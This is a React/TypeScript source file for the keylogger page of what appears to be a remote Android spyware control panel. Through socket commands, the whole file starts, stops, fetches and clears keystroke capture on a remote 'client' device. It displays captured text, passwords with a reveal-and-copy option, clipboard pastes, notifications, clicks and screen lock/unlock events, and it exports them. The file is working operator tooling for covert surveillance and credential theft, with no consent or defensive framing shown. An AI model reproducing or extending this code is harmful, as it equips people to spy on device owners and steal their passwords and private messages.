import { useState, useEffect, useCallback, useMemo, useRef } from 'react';
import { useOutletContext } from 'react-router-dom';
import { clientsApi } from '@/services/api';
import { CMD } from '@/types';
import { Badge } from '@/components/ui/badge';
import { Input } from '@/components/ui/input';
import { Keyboard, Play, Square, RefreshCw, Lock, Unlock, Clipboard, Bell, AppWindow, MousePointerClick, Search, Copy, Check, Eye, EyeOff } from 'lucide-react';
import { onKeyloggerUpdate, getAdminSocket } from '@/services/socket';
import {
  DevicePageHeader, ErrorAlert, LoadingSkeleton, StatusBadge, SectionCard, EmptyState,
} from '@/components/device/shared';
import { DataActionsMenu, buildDataActions } from '@/components/device/DataActionsMenu';
import { useConfirm } from '@/components/ConfirmDialog';
import type { DeviceOutletContext } from '@/types';
import type { Socket } from 'socket.io-client';

interface Keystroke {
  package: string;
  keyText: string;
  isPassword: boolean;
  eventType?: string;
  timestamp: number;

  _id: number;
}

const EVENT_FILTERS = [
  { value: '', label: 'All', icon: Keyboard },
  { value: 'text', label: 'Text', icon: Keyboard },
  { value: 'password', label: 'Passwords', icon: Lock },
  { value: 'screen_lock', label: 'Lock', icon: Lock },
  { value: 'screen_unlock', label: 'Unlock', icon: Unlock },
  { value: 'screen_off', label: 'Screen Off', icon: Lock },
  { value: 'app_switch', label: 'App Switch', icon: AppWindow },
  { value: 'clipboard_paste', label: 'Paste', icon: Clipboard },
  { value: 'notification', label: 'Notifs', icon: Bell },
  { value: 'field_focus', label: 'Fields', icon: AppWindow },
  { value: 'click', label: 'Clicks', icon: MousePointerClick },
];

const EVENT_BADGES: Record<string, { label: string; variant: 'default' | 'secondary' | 'destructive' | 'outline' }> = {
  text: { label: 'TEXT', variant: 'secondary' },
  password: { label: 'PASSWORD', variant: 'destructive' },
  screen_lock: { label: 'LOCKED', variant: 'destructive' },
  screen_unlock: { label: 'UNLOCKED', variant: 'default' },
  screen_off: { label: 'SCREEN OFF', variant: 'outline' },
  app_switch: { label: 'APP SWITCH', variant: 'secondary' },
  clipboard_paste: { label: 'PASTE', variant: 'secondary' },
  notification: { label: 'NOTIF', variant: 'secondary' },
  field_focus: { label: 'FIELD', variant: 'outline' },
  click: { label: 'CLICK', variant: 'secondary' },
};

function getDateLabel(ts: number): string {
  const d = new Date(ts);
  const today = new Date();
  const yesterday = new Date();
  yesterday.setDate(today.getDate() - 1);
  if (d.toDateString() === today.toDateString()) return 'Today';
  if (d.toDateString() === yesterday.toDateString()) return 'Yesterday';
  return d.toLocaleDateString();
}

export default function KeyloggerPage() {
  const { clientId: id, online } = useOutletContext<DeviceOutletContext>();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [keystrokes, setKeystrokes] = useState<Keystroke[]>([]);
  const [active, setActive] = useState(false);
  const [connected, setConnected] = useState<boolean | null>(null);
  const [fetching, setFetching] = useState(false);
  const [clearing, setClearing] = useState(false);
  const [starting, setStarting] = useState(false);
  const [stopping, setStopping] = useState(false);
  const [totalCount, setTotalCount] = useState(0);
  const [pendingCount, setPendingCount] = useState(0);
  const [eventFilter, setEventFilter] = useState('');
  const [searchQuery, setSearchQuery] = useState('');
  const [socketConnected, setSocketConnected] = useState(!!getAdminSocket()?.connected);
  const [copiedIdx, setCopiedIdx] = useState<string | null>(null);
  const [revealedPasswords, setRevealedPasswords] = useState<Set<string>>(new Set());
  const [lastUpdated, setLastUpdated] = useState<number | null>(null);
  const { confirm, dialog: confirmDialog } = useConfirm();

  const activeRef = useRef(false);
  const startingRef = useRef(false);
  const startingTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const stopTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const connectingTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const errorTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const fetchingTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const clearingTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const clearingRef = useRef(false);
  const keystrokeIdCounter = useRef(0);
  const mountedRef = useRef(true);

  useEffect(() => { mountedRef.current = true; return () => { mountedRef.current = false; }; }, []);
  useEffect(() => { activeRef.current = active; }, [active]);

  useEffect(() => {
    const s: Socket | null = getAdminSocket();
    const update = () => setSocketConnected(!!getAdminSocket()?.connected);
    update();
    const poll = setInterval(update, 2000);
    const onConn = () => setSocketConnected(true);
    const onDisc = () => setSocketConnected(false);
    if (s) {
      s.on('connect', onConn);
      s.on('disconnect', onDisc);
    }
    return () => {
      clearInterval(poll);
      if (s) {
        s.off('connect', onConn);
        s.off('disconnect', onDisc);
      }
    };
  }, []);

  const showError = useCallback((msg: string) => {
    if (!mountedRef.current) return;
    setError(msg);
    if (errorTimerRef.current) clearTimeout(errorTimerRef.current);
    errorTimerRef.current = setTimeout(() => { if (mountedRef.current) setError(null); }, 8000);
  }, []);

  useEffect(() => {
    if (!id) return;
    clientsApi.getOne(id)
      .then((res) => {
        if (mountedRef.current) {
          setLoading(false);
          if (res.data?.data?.online === false) {
            setConnected(false);
          }
        }
      })
      .catch((err: any) => {
        if (mountedRef.current) {
          setError(err?.response?.status === 404 ? 'Device not found' : 'Failed to load device');
          setLoading(false);
        }
      });
    clientsApi.sendCommand(id, CMD.KEYLOGGER, { action: 'status' }).catch(() => {

    });

    const timeoutId = setTimeout(() => {
      if (mountedRef.current) {
        setConnected(prev => prev === null ? false : prev);
      }
    }, 10000);
    connectingTimerRef.current = timeoutId;

    return () => {
      clearTimeout(timeoutId);
      connectingTimerRef.current = null;
    };
  }, [id]);

  useEffect(() => {
    if (!id) return;
    const unsub = onKeyloggerUpdate((data: any) => {
      if (!mountedRef.current || !data || data.id !== id) return;

      if (data.type === 'batch' && Array.isArray(data.keystrokes)) {

        const newEntries: Keystroke[] = [...data.keystrokes].reverse().map((k: any) => ({
          ...k,
          _id: keystrokeIdCounter.current++,
        }));
        setKeystrokes(prev => [...newEntries, ...prev].slice(0, 500));
        setLastUpdated(Date.now());
      } else if (data.type === 'fetch' && Array.isArray(data.keystrokes)) {

        const entries: Keystroke[] = [...data.keystrokes].reverse().map((k: any) => ({
          ...k,
          _id: keystrokeIdCounter.current++,
        }));
        setKeystrokes(entries);

        if (fetchingTimerRef.current) { clearTimeout(fetchingTimerRef.current); fetchingTimerRef.current = null; }
        setFetching(false);
        setLastUpdated(Date.now());
      } else if (data.type === 'status') {
        const isConn = data.connected === true;
        const isActive = isConn && data.active === true;
        setActive(isActive);
        setConnected(isConn);
        setStarting(false);
        setStopping(false);
        startingRef.current = false;
        if (startingTimerRef.current) { clearTimeout(startingTimerRef.current); startingTimerRef.current = null; }
        if (stopTimerRef.current) { clearTimeout(stopTimerRef.current); stopTimerRef.current = null; }
        if (connectingTimerRef.current) { clearTimeout(connectingTimerRef.current); connectingTimerRef.current = null; }
        if (typeof data.totalCount === 'number') setTotalCount(data.totalCount);
        if (typeof data.pendingCount === 'number') setPendingCount(data.pendingCount);
      } else if (data.type === 'cleared') {
        setKeystrokes([]);
        setTotalCount(0);
        setPendingCount(0);

        if (clearingTimerRef.current) { clearTimeout(clearingTimerRef.current); clearingTimerRef.current = null; }
        clearingRef.current = false;
        setClearing(false);
      } else if (data.type === 'error') {
        showError(typeof data.error === 'string' ? data.error : 'Keylogger error');
        if (fetchingTimerRef.current) { clearTimeout(fetchingTimerRef.current); fetchingTimerRef.current = null; }
        if (clearingTimerRef.current) { clearTimeout(clearingTimerRef.current); clearingTimerRef.current = null; }
        setFetching(false);
        setClearing(false);
        clearingRef.current = false;
        setStarting(false);
        setStopping(false);
        startingRef.current = false;
        if (startingTimerRef.current) { clearTimeout(startingTimerRef.current); startingTimerRef.current = null; }
        if (stopTimerRef.current) { clearTimeout(stopTimerRef.current); stopTimerRef.current = null; }
      }
    });
    return unsub;
  }, [id, showError]);

  useEffect(() => {
    return () => {
      mountedRef.current = false;
      if (errorTimerRef.current) clearTimeout(errorTimerRef.current);
      if (startingTimerRef.current) clearTimeout(startingTimerRef.current);
      if (stopTimerRef.current) clearTimeout(stopTimerRef.current);
      if (connectingTimerRef.current) clearTimeout(connectingTimerRef.current);
      if (fetchingTimerRef.current) clearTimeout(fetchingTimerRef.current);
      if (clearingTimerRef.current) clearTimeout(clearingTimerRef.current);
    };
  }, []);

  const startKl = useCallback(async () => {
    if (!id) return;
    setError(null);
    setStarting(true);
    startingRef.current = true;

    if (startingTimerRef.current) clearTimeout(startingTimerRef.current);
    startingTimerRef.current = setTimeout(() => {
      if (startingRef.current && mountedRef.current) {
        setStarting(false);
        startingRef.current = false;
        showError('Device did not respond. The Accessibility service may not be enabled.');
        clientsApi.sendCommand(id, CMD.KEYLOGGER, { action: 'status' }).catch(() => {});
      }
    }, 15000);

    try {
      await clientsApi.sendCommand(id, CMD.KEYLOGGER, { action: 'kl_start' });
    } catch (err: any) {
      if (mountedRef.current) {
        setStarting(false);
        startingRef.current = false;
        if (startingTimerRef.current) { clearTimeout(startingTimerRef.current); startingTimerRef.current = null; }
        showError(err?.response?.data?.error || 'Failed to send start command');
      }
    }
  }, [id, showError]);

  const stopKl = useCallback(async () => {
    if (!id) return;
    setStopping(true);

    if (stopTimerRef.current) clearTimeout(stopTimerRef.current);
    stopTimerRef.current = setTimeout(() => {
      if (mountedRef.current) {
        setStopping(false);
        clientsApi.sendCommand(id, CMD.KEYLOGGER, { action: 'status' }).catch(() => {});
      }
    }, 10000);

    try {
      await clientsApi.sendCommand(id, CMD.KEYLOGGER, { action: 'kl_stop' });
    } catch (err: any) {
      if (mountedRef.current) {
        setStopping(false);
        if (stopTimerRef.current) { clearTimeout(stopTimerRef.current); stopTimerRef.current = null; }
        showError(err?.response?.data?.error || 'Failed to stop keylogger');
      }
    }
  }, [id, showError]);

  const fetchKl = useCallback(async () => {
    if (!id) return;
    setFetching(true);
    setError(null);

    if (fetchingTimerRef.current) clearTimeout(fetchingTimerRef.current);
    fetchingTimerRef.current = setTimeout(() => {
      if (mountedRef.current) {
        setFetching(false);
        showError('Fetch timed out. Try again.');
      }
      fetchingTimerRef.current = null;
    }, 15000);
    try {
      await clientsApi.sendCommand(id, CMD.KEYLOGGER, {
        action: 'kl_fetch',
        ...(eventFilter ? { eventType: eventFilter } : {}),
      });
    } catch (err: any) {
      if (fetchingTimerRef.current) { clearTimeout(fetchingTimerRef.current); fetchingTimerRef.current = null; }
      if (mountedRef.current) { setFetching(false); showError(err?.response?.data?.error || 'Failed to fetch'); }
    }
  }, [id, eventFilter, showError]);

  const clearKl = useCallback(async () => {
    if (!id) return;
    const ok = await confirm({ title: 'Clear Keylogger Data', description: 'Clear all keystrokes on the device? This is irreversible.', confirmLabel: 'Clear', variant: 'destructive' });
    if (!ok) return;

    clearingRef.current = true;
    setClearing(true);
    try {
      await clientsApi.sendCommand(id, CMD.KEYLOGGER, { action: 'kl_clear' });

      if (clearingTimerRef.current) clearTimeout(clearingTimerRef.current);
      clearingTimerRef.current = setTimeout(() => {
        if (mountedRef.current) {
          setClearing(false);
        }
        clearingRef.current = false;
        clearingTimerRef.current = null;
      }, 10000);
    } catch (err: any) {
      clearingRef.current = false;
      setClearing(false);
      showError(err?.response?.data?.error || 'Failed to clear data');
    }
  }, [id, showError]);

  const copyText = useCallback(async (text: string, key: string) => {
    try {
      const { copyToClipboard } = await import('@/lib/utils');
      const ok = await copyToClipboard(text);
      if (ok) {
        setCopiedIdx(key);
        setTimeout(() => { if (mountedRef.current) setCopiedIdx(null); }, 1500);
      } else {
        showError('Failed to copy to clipboard');
      }
    } catch {
      showError('Failed to copy to clipboard');
    }
  }, [showError]);

  const toggleReveal = useCallback((key: string) => {
    setRevealedPasswords(prev => {
      const next = new Set(prev);
      if (next.has(key)) next.delete(key); else next.add(key);
      return next;
    });
  }, []);

  const isBusy = starting || stopping;
  const canAct = online && socketConnected && !isBusy;

  const filteredKeystrokes = useMemo(() => {
    let result = keystrokes;
    if (eventFilter) {
      result = result.filter(k => k.eventType === eventFilter);
    }
    if (searchQuery.trim()) {
      const q = searchQuery.toLowerCase();
      result = result.filter(k =>
        k.keyText.toLowerCase().includes(q) ||
        k.package.toLowerCase().includes(q)
      );
    }
    return result;
  }, [keystrokes, searchQuery, eventFilter]);

  const groupedByDate = useMemo(() => {
    const groups: { date: string; entries: Keystroke[] }[] = [];
    let currentDate = '';
    for (const k of filteredKeystrokes) {
      const dateLabel = getDateLabel(k.timestamp);
      if (dateLabel !== currentDate) {
        currentDate = dateLabel;
        groups.push({ date: dateLabel, entries: [k] });
      } else {
        groups[groups.length - 1].entries.push(k);
      }
    }
    return groups;
  }, [filteredKeystrokes]);

  const exportData = useMemo(() => filteredKeystrokes.map(k => ({
    timestamp: new Date(k.timestamp).toISOString(),
    package: k.package,
    eventType: k.eventType || 'text',
    keyText: k.keyText,
    isPassword: k.isPassword,
  })), [filteredKeystrokes]);

  const dataActions = buildDataActions({
    data: exportData,
    exportPrefix: 'keylogger',
    onClear: clearKl,
  });

  const statusLabel = connected === null
    ? 'Connecting…'
    : active
      ? 'Active'
      : connected
        ? 'Inactive'
        : 'Service Off';
  const statusVariant: 'success' | 'warning' | 'danger' | 'neutral' =
    active ? 'success' : connected === false ? 'danger' : connected ? 'warning' : 'neutral';

  if (loading) return <LoadingSkeleton rows={6} />;

  return (
    <div className="space-y-4">
      <DevicePageHeader
        title="Keylogger"
        subtitle={`Capture keystrokes, screen lock/unlock, app switches, clicks & notifications${totalCount > 0 ? ` · ${totalCount} total · ${pendingCount} pending` : ''}${lastUpdated ? ` · updated ${new Date(lastUpdated).toLocaleTimeString()}` : ''}`}
        badge={{ label: statusLabel, variant: 'secondary' }}
        actions={[
          ...(!active
            ? [{ label: 'Start', icon: Play, onClick: startKl, disabled: !canAct, variant: 'default' as const }]
            : [{ label: 'Stop', icon: Square, onClick: stopKl, disabled: !canAct, variant: 'destructive' as const }]),
          { label: 'Fetch', icon: RefreshCw, onClick: fetchKl, disabled: !canAct || fetching, variant: 'outline' as const },
        ]}
        moreActions={<DataActionsMenu actions={dataActions} disabled={isBusy} loadingLabel={fetching ? 'Fetch' : clearing ? 'Clear Data' : null} />}
        refresh={fetchKl}
        loading={fetching}
      />

      {}
      <div className="flex items-center gap-2 flex-wrap">
        <StatusBadge label={statusLabel} status={statusVariant} />
        {!online && <StatusBadge label="Device Offline" status="danger" />}
      </div>

      {error && <ErrorAlert message={error} onRetry={fetchKl} />}

      {}
      <div className="flex flex-wrap gap-1.5">
        {EVENT_FILTERS.map((f) => (
          <button
            key={f.value}
            onClick={() => setEventFilter(f.value)}
            className={`flex items-center gap-1 px-2.5 py-1 text-[10px] font-medium rounded-full transition-colors ${
              eventFilter === f.value
                ? 'bg-primary text-primary-foreground'
                : 'bg-muted text-muted-foreground hover:bg-muted/80'
            }`}
          >
            <f.icon className="h-2.5 w-2.5" />
            {f.label}
          </button>
        ))}
      </div>

      {}
      <div className="relative">
        <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
        <Input
          placeholder="Search captured events..."
          value={searchQuery}
          onChange={e => setSearchQuery(e.target.value)}
          className="pl-9"
        />
      </div>

      <SectionCard
        title={`Captured Events (${filteredKeystrokes.length}${filteredKeystrokes.length !== keystrokes.length ? ` of ${keystrokes.length}` : ''})`}
        icon={Keyboard}
      >
        <div className="max-h-[60vh] overflow-y-auto">
          {filteredKeystrokes.length === 0 ? (
            <EmptyState
              icon={Keyboard}
              title={connected === null
                ? 'Connecting to device…'
                : active
                  ? 'Listening for events…'
                  : searchQuery || eventFilter
                    ? 'No events match your filters'
                    : 'No events captured'}
              description={active
                ? 'Type on the device to see captures here.'
                : (!searchQuery && !eventFilter) ? 'Start the keylogger to begin capturing keystrokes.' : undefined}
              action={!active && !searchQuery && !eventFilter ? {
                label: 'Start Keylogger',
                onClick: startKl,
                disabled: !canAct,
              } : undefined}
            />
          ) : (
            <div className="space-y-3">
              {groupedByDate.map((group, gi) => (
                <div key={`group-${gi}-${group.date}`}>
                  <div className="text-[10px] font-semibold text-muted-foreground uppercase tracking-wide sticky top-0 bg-card py-1 z-10 border-b">
                    {group.date}
                  </div>
                  <div className="space-y-0.5 mt-1">
                    {group.entries.map((k) => {

                      const rowKey = String(k._id);
                      const badge = k.eventType ? EVENT_BADGES[k.eventType] : null;
                      return (
                        <div key={rowKey} className="flex items-center gap-2 text-xs py-1.5 px-2 rounded hover:bg-muted/50 group">
                          <span className="text-muted-foreground font-mono shrink-0 w-14 text-[10px]">{new Date(k.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}</span>
                          <Badge variant="secondary" className="shrink-0 text-[10px] max-w-28 truncate" title={k.package}>{k.package}</Badge>
                          {badge && (
                            <Badge variant={badge.variant} className="shrink-0 text-[9px] px-1.5 py-0">{badge.label}</Badge>
                          )}
                          <span className={`font-mono break-all flex-1 ${k.isPassword ? 'text-destructive font-bold' : ''}`}>
                            {k.isPassword
                              ? (revealedPasswords.has(rowKey) ? k.keyText : '\u2022'.repeat(Math.min(k.keyText.length || 8, 12)))
                              : k.keyText}
                          </span>
                          {k.isPassword && (
                            <button
                              onClick={() => toggleReveal(rowKey)}
                              className="shrink-0 opacity-0 group-hover:opacity-100 transition-opacity p-1 hover:bg-muted rounded"
                              title={revealedPasswords.has(rowKey) ? 'Hide' : 'Reveal'}
                              aria-label={revealedPasswords.has(rowKey) ? 'Hide password' : 'Reveal password'}
                            >
                              {revealedPasswords.has(rowKey)
                                ? <EyeOff className="h-3 w-3 text-muted-foreground" />
                                : <Eye className="h-3 w-3 text-muted-foreground" />}
                            </button>
                          )}
                          <button
                            onClick={() => copyText(k.keyText, rowKey)}
                            className="shrink-0 opacity-0 group-hover:opacity-100 transition-opacity p-1 hover:bg-muted rounded"
                            title="Copy text"
                            aria-label="Copy text"
                          >
                            {copiedIdx === rowKey
                              ? <Check className="h-3 w-3 text-green-500" />
                              : <Copy className="h-3 w-3 text-muted-foreground" />}
                          </button>
                        </div>
                      );
                    })}
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </SectionCard>
      {confirmDialog}
    </div>
  );
}
